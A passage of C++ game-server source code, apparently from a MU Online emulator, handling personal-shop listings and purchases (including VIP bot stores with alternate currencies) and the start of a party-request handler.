			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, gObj[aSourceIndex].m_IfState.type);
		return;
	}

#if (PACK_EDITION>=3)
	if (lpObj->IsBot == 4)
	{
		char sbuf[100]={0};
		if(lpObj->BotDefense == 1 && lpObj->Vip != 1)
		{
			LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller is not VIP (%d)"
				,gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,  MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL) );
			
			GCServerMsgStringSend("This Personal Shop its only for VIP Users",aSourceIndex, 1);
			return;
		}
		wsprintf(sbuf,"Welcome to %s BotStore",lpObj->Name);
		GCServerMsgStringSend(sbuf,aSourceIndex, 0);
		switch(lpObj->BotPower)
		{
			case 0:
			{
				GCServerMsgStringSend("This Personal Shop use Zen",aSourceIndex, 0);
			}break;
			case 1:
			{
				GCServerMsgStringSend("This Personal Shop use PCPoints",aSourceIndex, 0);
				//GCMoneySend(aSourceIndex, gObj[aSourceIndex].PCPoints);

				if(ReadConfig.S5E2 != 0)
				{
					wsprintf(sbuf,"PCPoints = %d",gObj[aSourceIndex].PCPoints);
					GCServerMsgStringSend(sbuf,aSourceIndex, 1);
				}
			}break;
			case 2:
			{
				GCServerMsgStringSend("This Personal Shop use Vip Money",aSourceIndex, 0);
				//GCMoneySend(aSourceIndex, gObj[aSourceIndex].VipMoney);

				wsprintf(sbuf,"VipMoney = %d",gObj[aSourceIndex].VipMoney);
				GCServerMsgStringSend(sbuf,aSourceIndex, 1);
			}break;
		}
		
		LogAddTD("[PShop] [%s][%s] is Receiving PShop List From [BotStore][%s]",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->Name);

	}else
#endif
	{
		LogAddTD("[PShop] [%s][%s] is Receiving PShop List From [%s][%s]",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->AccountID, lpObj->Name);
	}

	gObj[aSourceIndex].m_bPShopWantDeal = true;
	gObj[aSourceIndex].m_iPShopDealerIndex = lpObj->m_Index;
	memcpy(gObj[aSourceIndex].m_szPShopDealerName, lpObj->Name, MAX_ACCOUNT_LEN);
	::CGPShopAnsBuyList(aSourceIndex, lpObj->m_Index, 1, false);
}




struct PMSG_BUYLIST_FROM_PSHOP
{
	BYTE Pos;	// 0
	BYTE ItemInfo[MAX_ITEM_INFO];	// 1
	int PShopItemValue;	// 8
};




struct PMSG_ANS_BUYLIST_FROM_PSHOP
{
	PWMSG_HEAD2 h;	// C2:3F:[05:13]
	BYTE Result;	// 5
	BYTE NumberH;	// 6
	BYTE NumberL;	// 7
	BYTE btName[10];	// 8
	char szPShopText[36];	// 12
	BYTE btCount;	// 36
};


void CGPShopAnsBuyList(int aSourceIndex, int aTargetIndex, BYTE btResult, bool bResend)
{
	if ( gDoPShopOpen == FALSE )
		return;
	

	PMSG_ANS_BUYLIST_FROM_PSHOP pMsgILC;	// Packet Message Item List Count
	PMSG_BUYLIST_FROM_PSHOP pMsgIL;
	BYTE sendBuf[1024]={0};
	int sOfs = sizeof(pMsgILC);
	int pMsgILSize = sizeof(pMsgIL);

	if ( btResult != 1 )
	{
		pMsgILC.h.c = 0xC2;
		pMsgILC.h.headcode = 0x3F;

		if ( bResend == false )
			pMsgILC.h.subcode = 0x05;
		else
			pMsgILC.h.subcode = 0x13;

		pMsgILC.h.sizeH = SET_NUMBERH(sOfs);
		pMsgILC.h.sizeL = SET_NUMBERL(sOfs);
		pMsgILC.btCount = 0;
		pMsgILC.Result = btResult;
		pMsgILC.NumberH = SET_NUMBERH(aTargetIndex);
		pMsgILC.NumberL = SET_NUMBERL(aTargetIndex);
		memset(pMsgILC.btName, 0, sizeof(pMsgILC.btName));
		memset(pMsgILC.szPShopText, 0, sizeof(pMsgILC.szPShopText));
		memcpy(sendBuf, &pMsgILC, sizeof(pMsgILC));

		DataSend(aSourceIndex, sendBuf, sOfs);
	}
	else
	{
		if(OBJMAX_RANGE(aTargetIndex) == 0)
		{
			return;
		}
		//LPOBJ lpObjSource = &gObj[aSourceIndex];
		LPOBJ lpObjTarget = &gObj[aTargetIndex];
		int iCount = 0;

		//for ( int n=ReadConfig.MAIN_INVENTORY_SIZE(lpObjTarget->m_Index,false);n<ReadConfig.INVENTORY_SIZE(lpObjTarget->m_Index,false);n++)
		for ( int n=ReadConfig.INVENTORY_SIZE(lpObjTarget->m_Index,false)-PSHOP_SIZE;n<ReadConfig.INVENTORY_SIZE(lpObjTarget->m_Index,false);n++)
		{
			if ( lpObjTarget->Inventory1[n].IsItem() == TRUE )
			{
				pMsgIL.Pos = n;
				ItemByteConvert(pMsgIL.ItemInfo, lpObjTarget->Inventory1[n]);
				pMsgIL.PShopItemValue = lpObjTarget->Inventory1[n].m_iPShopValue;
				memcpy(&sendBuf[sOfs], &pMsgIL, pMsgILSize);
				sendBuf[sOfs+13]=0;
				sendBuf[sOfs+14]=0;
				sendBuf[sOfs+15]=0;
				iCount++;
				sOfs += pMsgILSize;

				LogAddTD("ITEM TYPE:%d", lpObjTarget->Inventory1[n].m_Type);
			}
		}

		pMsgILC.h.c = 0xC2;
		pMsgILC.h.headcode = 0x3F;

		if ( bResend == false )
			pMsgILC.h.subcode = 0x05;
		else
			pMsgILC.h.subcode = 0x13;

		pMsgILC.h.sizeH = SET_NUMBERH(sOfs);
		pMsgILC.h.sizeL = SET_NUMBERL(sOfs);
		pMsgILC.btCount = iCount;
		pMsgILC.Result = btResult;
		pMsgILC.NumberH = SET_NUMBERH(aTargetIndex);
		pMsgILC.NumberL = SET_NUMBERL(aTargetIndex);
		memcpy(pMsgILC.btName, lpObjTarget->Name, sizeof(pMsgILC.btName));
		memcpy(pMsgILC.szPShopText, lpObjTarget->m_szPShopText, sizeof(pMsgILC.szPShopText));
		memcpy(sendBuf, &pMsgILC, sizeof(pMsgILC));

		sendBuf[0x32] = 0x8e;
		sendBuf[0x33] = 0x76;
		sendBuf[0x34] = 0x00;
		sendBuf[0x35] = 0xb0;

		DataSend(aSourceIndex, sendBuf, sOfs);

	}
}





void CGPShopReqBuyItem(PMSG_REQ_BUYITEM_FROM_PSHOP * lpMsg, int aSourceIndex)
{
	if ( gDoPShopOpen == FALSE )
		return;

	if ( gObjIsConnected( MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL)) == FALSE )
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller did Not CONNECTED (%d)",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL));
		::CGPShopAnsBuyItem(aSourceIndex, -1, 0, 2);
		return;
	}

	LPOBJ lpObj = &gObj[MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL)];

	if ( lpObj->Type != OBJ_USER 
#if (PACK_EDITION>=3)
		&& lpObj->IsBot != 4
#endif
		)
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller is Not CHARACTER (%d)",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,  MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL));
		::CGPShopAnsBuyItem(aSourceIndex, -1, 0, 2);
		return;
	}

	if ( lpObj->CloseCount >= 0 )	
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller is Closing (%d)"
			,gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,  MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL)  );
		::CGPShopAnsBuyItem(aSourceIndex, -1, 0,2);
		return;
	}

	if ( gObj[aSourceIndex].CloseCount >= 0 )	
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Buyer is Closing (%d)",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,  MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL));
		::CGPShopAnsBuyItem(aSourceIndex, -1, 0, 2);
		return;
	}

	if ( lpObj->m_bMapSvrMoveQuit == true || lpObj->m_bMapAntiHackMove == true )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][PShop] - PShop Item Buy Req during MapServer Move: Seller [%s][%s]",
				lpObj->AccountID, lpObj->Name);
		}
		return;
	}

	if ( gObj[aSourceIndex].m_bMapSvrMoveQuit == true || gObj[aSourceIndex].m_bMapAntiHackMove == true )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][PShop] - PShop Item Buy Req during MapServer Move: Buyer [%s][%s]",
				gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name);
		}
		return;
	}

	if ( lpObj->m_bPShopOpen == false )
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Did not Open PShop",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->AccountID, lpObj->Name);
		::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 3);
		return;
	}

	char szName[MAX_ACCOUNT_LEN+1] = {0};
	memcpy(szName, lpMsg->btName, sizeof(lpMsg->btName));
	szName[MAX_ACCOUNT_LEN] = 0;
	int iITEM_LOG_TYPE;
	int iITEM_LOG_LEVEL;
	int iITEM_LOG_DUR;
	int iITEM_LOG_SERIAL;

	if ( strcmp(szName, lpObj->Name) )
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Name Mismatch [%s] - [%s]",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			szName, lpObj->Name);
		::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 6);

		return;
	}

	if ( lpObj->CloseType != -1 )
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] is Closing Connection",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->AccountID, lpObj->Name);
		::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0,2);

		return;
	}

	if ( (lpObj->Penalty &4) == 4 || (lpObj->Penalty &8) == 8 )
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] is in Item Block",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->AccountID, lpObj->Name);
		::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0,9);

		return;
	}

	if ( (gObj[aSourceIndex].Penalty &4) == 4 || (gObj[aSourceIndex].Penalty &8) == 8 )
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] is in Item Block",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->AccountID, lpObj->Name);
		::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0,9);

		return;
	}

	EnterCriticalSection(&lpObj->m_critPShopTrade);

	if ( lpObj->m_bPShopTransaction == true )
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Already Trade With Other",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->AccountID, lpObj->Name);
		::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0,4);
		LeaveCriticalSection(&lpObj->m_critPShopTrade);

	}
	else
	{
		lpObj->m_bPShopTransaction = true;
		LeaveCriticalSection(&lpObj->m_critPShopTrade);

		if ( gObjCheckSerial0ItemList(&lpObj->Inventory1[lpMsg->btItemPos]) != FALSE )
		{
			MsgOutput(lpObj->m_Index, lMsg.Get(MSGGET(13, 26)));
			GCReFillSend(aSourceIndex, gObj[aSourceIndex].Life, 0xFD, 1, gObj[aSourceIndex].iShield);

			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[ANTI-HACK][Serial 0 Item] [PShop Buy] (%s)(%s) Item(%s) Pos(%d)",
					lpObj->AccountID, lpObj->Name, lpObj->Inventory1[lpMsg->btItemPos].GetName(), lpMsg->btItemPos);
			}

			return;
		}

		if(gObjCheckSerialSpecialItemList(&lpObj->Inventory1[lpMsg->btItemPos]) != 0)
		{
			GCServerMsgStringSend("Can Not PShop Promo Items!", lpObj->m_Index, 1);
			return;
		}

		// New for Check Item Serials
		if ( ::gObjInventorySearchSerialNumber(&gObj[aSourceIndex], lpObj->Inventory1[lpMsg->btItemPos].GetNumber()) == FALSE )
		{
			::GCReFillSend(aSourceIndex, gObj[aSourceIndex].Life, -3, 1, gObj[aSourceIndex].iShield);
			LogAdd("error-L2 : CopyItem [%s][%s] return %s %d", gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
				__FILE__, __LINE__);

			return;
		}

		if ( ::gObjInventorySearchSerialNumber(lpObj, lpObj->Inventory1[lpMsg->btItemPos].GetNumber()) == FALSE )
		{
			GCReFillSend(lpObj->m_Index, lpObj->Life, -3, 1, lpObj->iShield);
			LogAdd("error-L2 : CopyItem [%s][%s] return %s %d",
				lpObj->AccountID, lpObj->Name,
				__FILE__, __LINE__);

			return;
		}

		if (gObjFixInventoryPointer(aSourceIndex) == false )
		{
			LogAdd( "[Fix Inv.Ptr] False Location - %s, %d", 
				__FILE__, __LINE__);
		}

		if ( gObj[aSourceIndex].pTransaction == 1 )
		{
			LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Requester Transaction == 1, IF_TYPE : %d",
				gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, gObj[aSourceIndex].m_IfState.type);
			return;
		}

		iITEM_LOG_TYPE=0;
		iITEM_LOG_LEVEL=0;
		iITEM_LOG_DUR=0;
		iITEM_LOG_SERIAL = 0;

		__try
		{
			if ( ReadConfig.PSHOP_RANGE(lpObj->m_Index,lpMsg->btItemPos,false) == FALSE )
			{
				::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 5);
				return;
			}

			if ( lpObj->m_bMapSvrMoveQuit == true || lpObj->m_bMapAntiHackMove == true )
			{
				CGPShopAnsBuyItem(aSourceIndex, -1, 0, 2);
				return;
			}

			if ( lpObj->Inventory1[lpMsg->btItemPos].IsItem() == TRUE )
			{
				if ( lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue <= 0 )
				{
					LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Did Not Choose Item Price",
						gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
						lpObj->AccountID, lpObj->Name);
					::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 6);

					return;
				}

				
				DWORD dwCost = lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue;

#if (PACK_EDITION>=3)
				if(lpObj->IsBot == 0)
				{
#endif
					if ( gObj[aSourceIndex].Money < lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue )
					{
						LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Lack of Zen",
							gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
							lpObj->AccountID, lpObj->Name);
						::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 7);

						return;
					}

					if ( lpObj->Money + dwCost > MAX_ZEN )
					{
						LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Exceeding Zen of the Host",
							gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
							lpObj->AccountID, lpObj->Name);
						::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 8);

						return;
					}
#if (PACK_EDITION>=3)
				}else
				{
					switch(lpObj->BotPower)
					{
						case 0:
						{
							if ( gObj[aSourceIndex].Money < lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue )
							{
								LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Lack of Zen",
									gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
									lpObj->AccountID, lpObj->Name);
								::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 7);

								return;
							}
						}break;
						case 1:
						{
							if ( gObj[aSourceIndex].PCPoints < lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue )
							{
								LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Lack of PCPoints",
									gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
									lpObj->AccountID, lpObj->Name);
								::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 7);
								gObj[aSourceIndex].PlayerExtraInfoModified = 1;

								return;
							}
						}break;
						case 2:
						{
							if ( gObj[aSourceIndex].VipMoney < lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue )
							{
								LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Lack of Vip Money",
									gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
									lpObj->AccountID, lpObj->Name);
								::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 7);
								gObj[aSourceIndex].AccountExtraInfoModified = 1;

								return;
							}
						}break;
					}
				}
#endif
				
				BYTE btNewItemPos = 0;
				btNewItemPos = ::gObjOnlyInventoryInsertItem(aSourceIndex, lpObj->Inventory1[lpMsg->btItemPos]);

				if ( btNewItemPos == 0xFF )
				{
					LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] No Room to Buy Item",
						gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
						lpObj->AccountID, lpObj->Name);
					::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 8);

					return;
				}
				
				iITEM_LOG_TYPE = lpObj->Inventory1[lpMsg->btItemPos].m_Type;
				iITEM_LOG_LEVEL = lpObj->Inventory1[lpMsg->btItemPos].m_Level;
				iITEM_LOG_DUR = lpObj->Inventory1[lpMsg->btItemPos].m_Durability;
				iITEM_LOG_SERIAL = lpObj->Inventory1[lpMsg->btItemPos].m_Number;

#if (PACK_EDITION>=3)
				if(lpObj->IsBot == 0)
				{
#endif
					::gObjInventoryItemSet_PShop(lpObj->m_Index, lpMsg->btItemPos, -1);
					lpObj->Inventory1[lpMsg->btItemPos].Clear();
					::GCInventoryItemDeleteSend(lpObj->m_Index, lpMsg->btItemPos, TRUE);
#if (PACK_EDITION>=3)
				}
#endif

#if (PACK_EDITION>=3)				
				if(lpObj->IsBot == 0)
				{
#endif
					gObj[aSourceIndex].Money -= dwCost;
					
					__int64 tmpZen = (__int64)lpObj->Money + (__int64)dwCost;
					if ( tmpZen + dwCost > MAX_ZEN)
					{
						lpObj->Money = MAX_ZEN;
					} else {
						lpObj->Money += dwCost;
					}

					::GCMoneySend(aSourceIndex, gObj[aSourceIndex].Money);
					::GCMoneySend(lpObj->m_Index, lpObj->Money);
					::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, btNewItemPos, 1);
					::CGPShopAnsSoldItem(lpObj->m_Index, aSourceIndex, lpMsg->btItemPos);
#if (PACK_EDITION>=3)
				}
				else
				{
					char sbuf[100]={0};
					switch(lpObj->BotPower)
					{
						case 0:
						{
							gObj[aSourceIndex].Money -= dwCost;
							::GCMoneySend(aSourceIndex, gObj[aSourceIndex].Money);
						}break;
						case 1:
						{
							gObj[aSourceIndex].PCPoints -= dwCost;
							gObj[aSourceIndex].PlayerExtraInfoModified = 1;
							PCShop.SendPoints(&gObj[aSourceIndex]);

							//::GCMoneySend(aSourceIndex, gObj[aSourceIndex].PCPoints);
						}break;
						case 2:
						{							
							gObj[aSourceIndex].VipMoney -= dwCost;
							gObj[aSourceIndex].AccountExtraInfoModified = 1;
							wsprintf(sbuf,"VipMoney = %d",gObj[aSourceIndex].VipMoney);
							GCServerMsgStringSend(sbuf,aSourceIndex, 1);

							//::GCMoneySend(aSourceIndex, gObj[aSourceIndex].VipMoney);
						}break;
					}
					GCInventoryItemOneSend(aSourceIndex, btNewItemPos);
				}
#endif
				
									
				LogAddTD("[PShop] [%s][%s][%s] PShop Item Buy Request Succeed : [%s][%s][%s] (Price=%d, ItemType:%d (%s), ItemLevel:%d, ItemDur:%d, Serial:%d",
					gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, gObj[aSourceIndex].Ip_addr,
					lpObj->AccountID, lpObj->Name, lpObj->Ip_addr, dwCost, iITEM_LOG_TYPE,
					ItemAttribute[iITEM_LOG_TYPE].Name, iITEM_LOG_LEVEL, iITEM_LOG_DUR, iITEM_LOG_SERIAL);

				if (PShop_CheckInventoryEmpty(lpObj->m_Index) == true )
				{
					LogAddTD("[PShop] [%s][%s] Sold All Items - Auto Closing PShop",
						lpObj->AccountID, lpObj->Name);::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 195)), lpObj->m_Index, 1);
					lpObj->m_bPShopOpen = false;
					memset(lpObj->m_szPShopText, 0, sizeof(lpObj->m_szPShopText));
					::CGPShopAnsClose(lpObj->m_Index, 1);
				}
				else
				{
					lpObj->m_bPShopItemChange = true;
				}

			}
		}
		__finally
		{
			lpObj->m_bPShopTransaction = false;
		}
	}
}





struct PMSG_ANS_BUYITEM_FROM_PSHOP
{
	PBMSG_HEAD2 h;	// C1:3F:06
	BYTE Result;	// 3
	BYTE NumberH;	// 5
	BYTE NumberL;	// 6
	BYTE cItemInfo[MAX_ITEM_INFO];	// 7
	BYTE btItemPos;	// E
};


void CGPShopAnsBuyItem(int aSourceIndex, int aTargetIndex, int iItemPos, BYTE btResult)
{
	PMSG_ANS_BUYITEM_FROM_PSHOP pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x06, sizeof(pMsg));
	pMsg.NumberH = SET_NUMBERH(aTargetIndex);
	pMsg.NumberL = SET_NUMBERL(aTargetIndex);
	pMsg.btItemPos = iItemPos;
	pMsg.Result = btResult;
	ItemByteConvert(pMsg.cItemInfo, gObj[aSourceIndex].Inventory1[iItemPos]);

	DataSend(aSourceIndex, (LPBYTE)&pMsg, pMsg.h.size);
}




struct PMSG_ANS_SOLDITEM_FROM_PSHOP
{
	PBMSG_HEAD2 h;	// C1:3F:08
	BYTE btItemPos;	// 4
	BYTE btName[10];	// 5
};


void CGPShopReqCloseDeal(PMSG_REQ_PSHOPDEAL_CLOSE * lpMsg, int aIndex)
{
	if ( !gObjIsConnected(aIndex))
		return;

	gObj[aIndex].m_bPShopWantDeal = false;
	gObj[aIndex].m_iPShopDealerIndex =-1;
	memset(gObj[aIndex].m_szPShopDealerName , 0, MAX_ACCOUNT_LEN);
}




void CGPShopAnsSoldItem(int aSourceIndex, int aTargetIndex, int iItemPos)
{
	PMSG_ANS_SOLDITEM_FROM_PSHOP pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x08, sizeof(pMsg));
	pMsg.btItemPos = iItemPos;
	memcpy(pMsg.btName, gObj[aTargetIndex].Name, MAX_ACCOUNT_LEN);

	DataSend(aSourceIndex, (LPBYTE)&pMsg, pMsg.h.size);
}




struct PMSG_REQ_DEALER_CLOSED_SHOP
{
	PBMSG_HEAD2 h;	// C1:3F:12
	BYTE NumberH;	// 4
	BYTE NumberL;	// 5
};


void CGPShopAnsDealerClosedShop(int aSourceIndex, int aTargetIndex)
{
	PMSG_REQ_DEALER_CLOSED_SHOP pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x12, sizeof(pMsg));
	pMsg.NumberH = SET_NUMBERH(aTargetIndex);
	pMsg.NumberL = SET_NUMBERL(aTargetIndex);

	DataSend(aSourceIndex, (LPBYTE)&pMsg, pMsg.h.size);
}




struct PMSG_PARTYREQUESTSEND
{
	PBMSG_HEAD h;	// C1:40
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
};


void CGPartyRequestRecv(PMSG_PARTYREQUEST * lpMsg, int aIndex)
{
	int number =  MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
	PMSG_PARTYREQUESTSEND pMsg;

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( number < 0 || number > OBJMAX-1)
		return;

	if (!PacketCheckTime(&gObj[aIndex]))
		return;

	if ( gObj[number].Type == OBJ_MONSTER )
	{
#if (PACK_EDITION>=3)
		if(gObj[number].IsBot == 1)
		{
			int player = gObj[number].BotNumOwner;
			if ( OBJMAX_RANGE(player) == TRUE )
			{
				if(gObjIsConnected(player))
				{
					char sbuf[512]={0};
					wsprintf(sbuf,"Ask my master %s",gObj[player].Name);
					ChatSend(&gObj[number], sbuf);
					::GCResultSend(aIndex, 0x41, 0x00);
				}
			}
		}
#endif
		return;
	}

	if ( !gObjIsConnected(&gObj[number]))
	{
		::GCResultSend(aIndex, 0x41, 0x03);
		return;
	}

	if ( gObj[aIndex].CloseCount >= 0 || gObj[number].CloseCount >= 0 )
	{
		::GCResultSend(aIndex, 0x41, 0x00);
		return;
	}

	if ( gObj[aIndex].m_bMapSvrMoveQuit == true || gObj[number].m_bMapSvrMoveQuit == true )
	{
		::GCResultSend(aIndex, 0x41, 0x00);
		return;
	}

	if ( gObj[aIndex].m_bMapAntiHackMove == true || gObj[number].m_bMapAntiHackMove == true )
	{
		::GCResultSend(aIndex, 0x41, 0x00);
		return;
	}

	if ( CC_MAP_RANGE(gObj[aIndex].MapNumber) )
	{
		::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
		return;
	}

	if ( IT_MAP_RANGE(gObj[aIndex].MapNumber) ) //ILLUSION DONT ALLOW PARTY WARP ROOM OR WRONG TEAM
	{
		::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
		return;
		/*BYTE Level = gObj[aIndex].MapNumber - 45;

		if (IllusionTemple.Room[Level].Start == 1)
		{
			BYTE pPos1 = IllusionTemple.Player_GetIndex(Level,number);
			BYTE pPos2 = IllusionTemple.Player_GetIndex(Level,aIndex);

			if (pPos1 == -1)
				return;

			if (pPos2 == -1)
				return;

			if (IllusionTemple.Room[Level].Player[pPos1].Team != IllusionTemple.Room[Level].Player[pPos2].Team )
			{
				::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
				return;
			}
		} else {
			::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
			return;
		}*/
	}

	LogAddL("Party result : %d %d %d %d", gObj[aIndex].CloseCount, gObj[number].CloseCount, gObj[aIndex].Connected, gObj[number].Connected);
	LogAddL("%s %s", gObj[aIndex].Name, gObj[number].Name);

	if ( gObj[aIndex].m_IfState.use > 0 )
	{
		::GCResultSend(aIndex, 0x41, 0x00);
		return;
	}
		
	if ( gObj[number].m_IfState.use > 0 )
	{
		::GCResultSend(aIndex, 0x41, 0x00);
		return;
	}

	if ( (gObj[number].m_Option &1) != 1 )
	{
		::GCResultSend(aIndex, 0x41, 0x01);
		return;
	}

	if ( gObj[aIndex].PartyNumber >= 0 )
	{
		int iUserIndex;
		int iDbNumber;
		gParty.GetIndexUser(gObj[aIndex].PartyNumber, 0, iUserIndex, iDbNumber);
		
		if ( iUserIndex < 0 || ( iUserIndex != aIndex && gObj[aIndex].DBNumber != iDbNumber )  )
		{
			::GCResultSend(aIndex, 0x41, 0x00);
			return;

		}
	}

	if ( gObj[aIndex].PartyTargetUser >= 0 )
		return;

	//if ( gObj[aIndex].PartyNumber >= 0 )
	//{
	//	::GCResultSend(aIndex, 0x41, 0x01);
	//	return;
	//}	

	if ( gObj[number].PartyNumber >= 0 )
	{
		::GCResultSend(aIndex, 0x41, 0x04);
		return;
	}

	if ( gObj[number].PartyTargetUser >= 0 )
	{
		::GCResultSend(aIndex, 0x41, 0x00);
		return;
	}

	if(Gens.Enabled == 1)
	{
		if ( gObj[aIndex].GensFam != gObj[number].GensFam && Gens.AllowPartyWithOtherGens == 0 )
		{
			if(gObj[aIndex].GensFam != 0 && gObj[number].GensFam != 0)
			{
				GCServerMsgStringSend("You cant make party with different Gens Family", aIndex, 1);
				return;
			}
		}
	}

	int maxlevel = 0;
	int minlevel = 0;

	if ( gObj[number].PartyNumber >= 0 )
	{

		if (gParty.Isleader(gObj[number].PartyNumber,number,gObj[number].DBNumber ) == FALSE)
		{
			char szTemp[256];
			wsprintf(szTemp, lMsg.Get(MSGGET(4, 84)), gObj[number].Name);
			GCServerMsgStringSend(szTemp, aIndex, 1);
			return;
		}

		if ( gParty.GetLevel( gObj[number].PartyNumber, maxlevel, minlevel) == TRUE )
		{
			int limmaxlevel;
			int limmaxlevel2;

			if ( maxlevel > gObj[number].Level )
				limmaxlevel = maxlevel;
			else
				limmaxlevel = gObj[number].Level;

			if ( maxlevel < gObj[number].Level )
				limmaxlevel2 = maxlevel;
			else
				limmaxlevel2 = gObj[number].Level;

			if ( (limmaxlevel - limmaxlevel2) > ReadConfig.Max_Party_Level_Dif )
			{
				::GCResultSend(aIndex, 0x41, 0x05);
				// Restricted level for the party is %d
				// DEATHWAY FIX HERE
				LogAdd(lMsg.Get(MSGGET(2, 189)), gObj[aIndex].Name, gObj[aIndex].Level, gObj[number].Name, gObj[number].Level);
				return;
			}

			int limminlevel;
			int limminlevel2;

			if ( maxlevel > gObj[number].Level )
				limminlevel = minlevel;
			else
				limminlevel = gObj[number].Level;

			if ( maxlevel < gObj[number].Level )
				limminlevel2 = minlevel;
			else
				limminlevel2 = gObj[number].Level;

			if ( (limminlevel - limminlevel2) > ReadConfig.Max_Party_Level_Dif )
			{
				::GCResultSend(aIndex, 0x41, 0x05);
				// Restricted level for the party is %d
				// DEATHWAY FIX HERE
				LogAdd(lMsg.Get(MSGGET(2, 189)), gObj[aIndex].Name, gObj[aIndex].Level, gObj[number].Name, gObj[number].Level);
				return;
			}
		}
	}
	else
	{
		short sMaxMinLevel[2];

		if ( gObj[aIndex].Level > gObj[number].Level )
			sMaxMinLevel[1] = gObj[aIndex].Level;
		else
